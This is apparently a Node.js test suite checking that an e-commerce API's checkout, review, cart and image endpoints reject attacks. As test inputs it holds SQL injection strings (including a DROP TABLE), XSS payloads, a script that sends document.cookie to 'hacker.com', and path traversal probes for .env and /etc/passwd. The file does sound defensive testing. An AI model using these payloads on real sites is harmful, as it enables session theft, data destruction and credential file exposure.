import { test, before, beforeEach, after } from 'node:test';
import assert from 'node:assert/strict';
import request from 'supertest';
import { app, setup, resetDb, teardown, loginAs, createUser, createProduct, addToCart, placeOrder, orderBody } from './helpers.js';
import { Order } from '../src/models/Order.js';
import { Review } from '../src/models/Review.js';

before(setup);
beforeEach(resetDb);
after(teardown);

test('Security Headers: Helmet sets protective HTTP headers on responses', async () => {
  const res = await request(app).get('/api/categories');
  assert.equal(res.status, 200);
  assert.equal(res.headers['x-content-type-options'], 'nosniff');
  assert.ok(res.headers['x-frame-options']);
});

test('Session Cookie Hardening: auth cookie is httpOnly, SameSite=Lax, Path=/', async () => {
  const u = await createUser();
  const res = await request(app).post('/api/auth/login').send({ email: u.email, password: u.password });
  assert.equal(res.status, 200);
  const cookieHeader = res.headers['set-cookie'];
  assert.ok(cookieHeader && cookieHeader.length > 0, 'Set-Cookie header should be present');
  const tokenCookie = cookieHeader.find((c) => c.startsWith('token='));
  assert.ok(tokenCookie, 'token cookie should be set');
  assert.match(tokenCookie, /HttpOnly/i, 'Cookie must have HttpOnly flag');
  assert.match(tokenCookie, /SameSite=Lax/i, 'Cookie must have SameSite=Lax');
  assert.match(tokenCookie, /Path=\//i, 'Cookie must have Path=/');
});

test('SQLi Prevention: checkout form rejects SQL injection in fullName', async () => {
  const { agent, user } = await loginAs();
  const p = await createProduct({ price: 100_000, stock: 10 });
  await addToCart(user._id, [[p, 1]]);

  const res = await agent.post('/api/orders').send(
    orderBody({
      shippingAddress: {
        fullName: "Admin' OR '1'='1",
        phone: '0901234567',
        address: '123 Đường Nguyễn Trãi, Quận 1',
      },
    }),
  );
  assert.equal(res.status, 400);
  assert.equal(res.body.code, 'VALIDATION');
  assert.ok(res.body.fieldErrors.shippingAddress);
});

test('SQLi Prevention: checkout form rejects SQL injection in phone', async () => {
  const { agent, user } = await loginAs();
  const p = await createProduct({ price: 100_000, stock: 10 });
  await addToCart(user._id, [[p, 1]]);

  const res = await agent.post('/api/orders').send(
    orderBody({
      shippingAddress: {
        fullName: 'Nguyễn Văn An',
        phone: "' UNION SELECT 1,2,3--",
        address: '123 Đường Nguyễn Trãi, Quận 1',
      },
    }),
  );
  assert.equal(res.status, 400);
  assert.equal(res.body.code, 'VALIDATION');
  assert.ok(res.body.fieldErrors.shippingAddress);
});

test('SQLi Prevention: checkout form rejects SQL injection in promotionCode', async () => {
  const { agent, user } = await loginAs();
  const p = await createProduct({ price: 100_000, stock: 10 });
  await addToCart(user._id, [[p, 1]]);

  const res = await agent.post('/api/orders').send(
    orderBody({
      promotionCode: "PROMO'; DROP TABLE orders;--",
    }),
  );
  assert.equal(res.status, 400);
  assert.equal(res.body.code, 'VALIDATION');
  assert.ok(res.body.fieldErrors.promotionCode);
});

test('SQLi Prevention: checkout voucher validate endpoint rejects SQL injection', async () => {
  const { agent } = await loginAs();
  const res = await agent.post('/api/promotions/validate').send({
    code: "WELCOME' OR '1'='1",
  });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, 'VALIDATION');
  assert.ok(res.body.fieldErrors.code);
});

test('XSS Prevention: checkout form rejects HTML/script tags in fullName and address', async () => {
  const { agent, user } = await loginAs();
  const p = await createProduct({ price: 100_000, stock: 10 });
  await addToCart(user._id, [[p, 1]]);

  const resName = await agent.post('/api/orders').send(
    orderBody({
      shippingAddress: {
        fullName: '<script>alert(1)</script>',
        phone: '0901234567',
        address: '123 Đường Nguyễn Trãi, Quận 1',
      },
    }),
  );
  assert.equal(resName.status, 400);
  assert.equal(resName.body.code, 'VALIDATION');

  const resAddr = await agent.post('/api/orders').send(
    orderBody({
      shippingAddress: {
        fullName: 'Nguyễn Văn An',
        phone: '0901234567',
        address: '<img src=x onerror=alert(document.cookie)>',
      },
    }),
  );
  assert.equal(resAddr.status, 400);
  assert.equal(resAddr.body.code, 'VALIDATION');
});

test('XSS Prevention: review comments sanitize HTML tags before saving to DB', async () => {
  const { agent, user } = await loginAs();
  const p = await createProduct();
  const order = await placeOrder(user, [[p, 1]]);
  await Order.updateOne({ _id: order._id }, { status: 'delivered', deliveredAt: new Date() });

  const res = await agent.post(`/api/products/${p._id}/reviews`).send({
    rating: 5,
    comment: 'Tuyệt vời! <script>fetch("http://hacker.com?c="+document.cookie)</script> Máy rất mượt.',
  });
  assert.equal(res.status, 201);
  assert.ok(!res.body.comment.includes('<script>'), 'Script tag should be stripped from response');
  assert.ok(res.body.comment.includes('Máy rất mượt'));

  const saved = await Review.findById(res.body._id);
  assert.ok(!saved.comment.includes('<script>'), 'Script tag must not be stored in DB');
});

test('NoSQL Injection: strips $ operators from body and query', async () => {
  const { agent, user } = await loginAs();
  const p = await createProduct({ price: 100_000, stock: 10 });
  await addToCart(user._id, [[p, 1]]);

  // Attempt NoSQL object injection in place of string
  const res = await agent.post('/api/orders').send({
    requestKey: `key-${Math.random().toString(36).slice(2)}`,
    paymentMethod: 'cod',
    shippingAddress: {
      fullName: { $gt: '' },
      phone: '0901234567',
      address: '123 Đường Lê Lợi, Quận 1',
    },
  });
  assert.equal(res.status, 400);
});

test('Path Traversal & LFI Guard: blocks directory traversal in URLs and queries', async () => {
  // Test path traversal attempt on images
  const res1 = await request(app).get('/api/images/../../.env');
  assert.equal(res1.status, 400);
  assert.equal(res1.body.code, 'MALICIOUS_REQUEST');

  // Test encoded directory traversal
  const res2 = await request(app).get('/api/images/%2e%2e%2f%2e%2e%2fconfig.js');
  assert.equal(res2.status, 400);
  assert.equal(res2.body.code, 'MALICIOUS_REQUEST');

  // Test sensitive file probing in query
  const res3 = await request(app).get('/api/products?q=../../../../etc/passwd');
  assert.equal(res3.status, 400);
  assert.equal(res3.body.code, 'MALICIOUS_REQUEST');

  // Test null-byte injection
  const res4 = await request(app).get('/api/products?cat=%00.env');
  assert.equal(res4.status, 400);
  assert.equal(res4.body.code, 'MALICIOUS_REQUEST');

  // Normal query with ellipsis should pass without false positive
  const resSafe = await request(app).get('/api/products?q=samsung...');
  assert.equal(resSafe.status, 200);
});

test('Quantity Tampering: cart rejects negative, zero, float, and excessive quantities', async () => {
  const { agent } = await loginAs();
  const p = await createProduct({ stock: 20 });

  // Negative quantity
  const resNegative = await agent.post('/api/cart/items').send({ productId: String(p._id), quantity: -1 });
  assert.equal(resNegative.status, 400);

  // Zero quantity
  const resZero = await agent.post('/api/cart/items').send({ productId: String(p._id), quantity: 0 });
  assert.equal(resZero.status, 400);

  // Floating point quantity
  const resFloat = await agent.post('/api/cart/items').send({ productId: String(p._id), quantity: 2.5 });
  assert.equal(resFloat.status, 400);

  // Excessive quantity (> 99)
  const resTooLarge = await agent.post('/api/cart/items').send({ productId: String(p._id), quantity: 100 });
  assert.equal(resTooLarge.status, 400);
});
